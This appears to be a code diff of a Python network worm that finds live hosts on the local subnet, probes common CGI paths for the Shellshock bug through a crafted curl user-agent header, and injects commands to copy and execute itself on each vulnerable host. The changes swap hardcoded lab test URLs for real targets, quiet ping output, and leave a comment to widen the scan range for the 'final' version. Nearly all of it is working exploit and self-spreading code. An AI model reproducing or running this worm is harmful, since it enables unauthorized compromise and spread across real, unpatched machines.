@@ -33,20 +33,15 @@ def log():
 
 # Creates a copy of the payload on host
 def copy_payload():
-	try:
-		f = open(payload_location,'x') # 'x' opens for exclusive creation, failing if the file already exists
-		f.write(payload_content)
-		f.close()
+	if not os.path.exists(folder):
+		os.mkdir(folder)
 
 	# If payload is already on host, then exit program
+	try:
+		f = open(payload_location,'x')
+		f.write(payload_content)
+		f.close()
 	except:
-		"""
-		# This can potentially check if a host has been infected, but the method isn't robust
-		try:
-			os.mkdir('/tmp/test_already_wormed')
-		except:
-			sys.exit(0)
-		"""
 		sys.exit(0)
 
 # Executes payload on host
@@ -56,12 +51,12 @@ def execute_payload():
 
 # Has the target been wormed?
 def already_wormed(target): # Pass in target as argument
-	url = 'http://192.168.56.111/cgi-bin/shock.sh'
+	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test
 	cmd = 'ls -la /tmp'
 
 	check = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
 	check += '\'' + cmd + '\'"'
-	check += ' ' + url
+	check += ' ' + target
 
 	# Gets output of curl request
 	a = subprocess.run(check, shell=True, stdout=subprocess.PIPE).stdout.decode()
@@ -72,14 +67,13 @@ def already_wormed(target): # Pass in target as argument
 
 # Inject worm to target and executes worm on target
 def inject(target, cmd_list): # Pass in target as argument
-
-	url = 'http://192.168.56.111/cgi-bin/shock.sh'
+	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test
 
 	for cmd in cmd_list:
 	# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '{cmd}'" {target}
 		exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
 		exploit += '\'' + cmd + '\'"'
-		exploit += ' ' + url + ' > /dev/null'
+		exploit += ' ' + target + ' > /dev/null'
 		subprocess.run(exploit, shell=True)
 
 # Prototype for shellshock exploit
@@ -106,27 +100,35 @@ def spread(targets):
 		if not already_wormed(target):
 			inject(target, cmd_list)
 
+# Host discovery on local network
+# TODO: Identify subnet and adjust scan for different subnets
 def local_ip_finder():
 	local_ips = []
-	subprocess.run("ifconfig | grep inet | head -n 1 | cut -d \" \" -f10 | cut -d \".\" -f1-3 > /tmp/ip.txt", shell=True)
-	part_local_ip = open("/tmp/ip.txt", "r").read().strip() # This will output an IP format of XXX.XXX.XXX
+	subprocess.run(f"ifconfig | grep inet | head -n 1 | cut -d \" \" -f10 | cut -d \".\" -f1-3 > {folder}/ip.txt", shell=True)
+	part_local_ip = open(f"{folder}/ip.txt", "r").read().strip() # This will output an IP format of XXX.XXX.XXX
 
-	for x in range(128,136): #CHANGE THIS to 1,255 for final
+	FNULL = open(os.devnull, 'w') # Hide output of ping
+
+	for x in range(128,136): # CHANGE THIS to 1,255 for final
 		full_local_ip = part_local_ip + "." + str(x)
 		#for y in range(1,255): # If I want to search ip XXX.XXX.yyy.yyy
-		#    full_local_ip = subnet_local_ip + "." + str(y)
-		ping_ip = subprocess.call(['ping', '-q', '-c', '1', "-W", "1", full_local_ip])
+		#	full_local_ip = subnet_local_ip + "." + str(y)
+		ping_ip = subprocess.call(['ping', '-q', '-c', '1', "-W", "1", full_local_ip], stdout=FNULL)
 		if ping_ip == 0:
 			local_ips.append(full_local_ip)
 		else:
 			pass
+
+	FNULL.close()
+
 	return local_ips
 
-def exploit_check(local_ips):
-    vuln_url_path = []
-	 cmd = "echo 123foo123"
-    #url = "http://192.168.220.128/cgi-bin/hello.sh"
-    #print(list_of_ip)
+# Search for vulnerable hosts
+def vuln_check(local_ips):
+	vuln_url_path = []
+	cmd = "echo 123foo123"
+	# url = "http://192.168.220.128/cgi-bin/hello.sh"
+	# print(list_of_ip)
 	for ip in local_ips:
 		for uri in cgi_list:
 			url = f'http://{ip}{uri}'
@@ -137,26 +139,17 @@ def exploit_check(local_ips):
 			output = subprocess.getoutput(exploit)
 			if "123foo123" in str(output):
 				vuln_url_path.append(url)
-	return vuln_url_path #Final list of vuln uri
+	return vuln_url_path #Final list of vuln urls
 
 def main():
-	# TODO:
-	# - Also implement something so worm doesn't infect the computer that started it
-	#
-	# checkifrunning() # if worm already exists on host, then exit
-	# gettargetIPs() # for now/simplicity/POC, just check if port 80 is open
-	# shellshockvulnscan(targetIPs) # check common cgi paths for shellshock vuln
-	#	returns target ip with its associated vulnerable path (if none, then exit program)
-	# createpayloadarray()
-	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself
-
 	copy_payload() # Success if test_payload is created
 	execute_payload() # Success if test_payload_exec is created. Also creates log.txt
 
 	# Scan local network for IPs and finds shellshock-vulnerable URLs
 	local_ips = local_ip_finder()
-	targets = exploit_check(local_ips)
+	targets = vuln_check(local_ips)
 
+	# Try to spread to vulnerable hosts
 	spread(targets)
 
 main()
